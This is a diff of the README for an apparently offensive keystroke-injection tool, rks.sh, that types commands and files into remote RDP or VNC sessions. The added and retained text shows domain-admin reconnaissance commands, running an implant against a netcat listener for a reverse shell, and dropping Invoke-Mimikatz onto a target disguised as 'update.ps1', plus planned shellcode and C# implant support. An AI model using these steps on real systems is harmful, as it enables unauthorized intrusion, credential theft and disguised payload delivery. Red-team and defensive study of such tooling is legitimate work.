@@ -12,15 +12,23 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 
 ```
 $ ./rks.sh -h
-Usage: rks.sh [-c <cmdfile> | -i <input> -o <tofile>] [-w <windowname>] [-h]
+Usage: ./rks.sh [-c <command | cmdfile> | -i <input_file> -o <output_file> -p <platform>] [-m <method>] [-w <windowname>] [-h]
 Options:
-    -c, --cmdfile <cmdfile>     Specify the file containing commands to execute
-    -i, --input <input>         Specify the input file to transfer
-    -o, --tofile <tofile>       Specify the output file to transfer
-    -w, --windowname <name>     Specify the window name for RDP (FreeRDP is set
-                                by default if not specified)
+    -c, --command <command | cmdfile>       Specify a command or a file containing to execute
+    -i, --input <input_file>                Specify the local input file to transfer
+    -o, --output <output_file>              Specify the remote output file to transfer
+    -m, --method <method>                   Specify the file transfer or execution method
+                                            (For file transfer "base64" is set by default if
+                                            not specified. For execution method "none" is set
+                                            by default if not specified)
 
-    -h, --help                  Display this help message
+    -p, --platform <operating_system>       Specify the operating system (windows is set by default
+                                            if not specified)
+
+    -w, --windowname <name>                     Specify the window name for graphical remote program (freerdp is set
+                                            by default if not specified)
+
+    -h, --help                              Display this help message
 ```
 
 ## Usage
@@ -31,6 +39,10 @@ Options:
 $ cat recon_cmds.txt
 net user
 net localgroup Administrators
+net user /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+net group "Domain Computers" /domain
 
 $ ./rks.h -c recon_cmds.txt
 ```
@@ -47,14 +59,6 @@ $ ./rks.sh -c implant.ps1
 $ nc -lvnp 4444
 ```
 
-- Execute a dropper implant by converting the EXE to hexadecimal using `exe2hex` (Doesn't work).
-
-```
-$ exe2hex -x implant.exe -p implant.bat
-
-$ ./rks.sh -c implant.bat
-```
-
 ### File Transfer
 
 - Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes.
@@ -62,28 +66,26 @@ $ ./rks.sh -c implant.bat
 ```
 $ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1
 
-$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1"
-```
-
-- Transfer and install tools with `plink.exe` for example (Does't work).
-
-```
-$ exe2hex -x plink.exe -p plink.bat
-
-$ ./rks.sh -i plink.bat
+$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m base64
 ```
 
 ### Specify Grapical Remote Software
 
-- If you're targetting legacy operating systems with older RDP authentication specify the window name with `rdesktop`.
+- If you're targeting VNC network protocols you can specify the window name with `tightvnc`.
+
+`$ ./rks.sh -i implant.ps1 -w tightvnc`
+
+- If you're targeting legacy operating systems with older RDP authentication specify the window name with `rdesktop`.
 
 `$ ./rks.sh -i implant.bat -w rdesktop`
 
 ## TODO and Help Wanted
 
-- Detect Remmina to execute keystrokes.
+- Implement Base64 file transfer
 
-- Detect VNC desktop sessions such as Meterpreter VNC, TightVNC, and Remmina.
+- Implement Bin2Hex file transfer
+
+- Implement to read shellcode input and run C# implant and powershell runspace
 
 ## References
 
